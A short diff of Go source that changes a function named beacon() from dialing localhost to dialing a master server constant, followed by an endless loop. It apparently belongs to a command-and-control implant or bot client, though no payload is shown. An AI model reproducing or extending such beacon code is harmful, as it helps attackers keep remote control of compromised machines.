@@ -21,7 +21,7 @@ const (
 )
 
 func beacon() {
-	conn, err := net.Dial("tcp", "localhost")
+	conn, err := net.Dial("tcp", masterServ)
 	errorHandler(err)
 	for true {
 
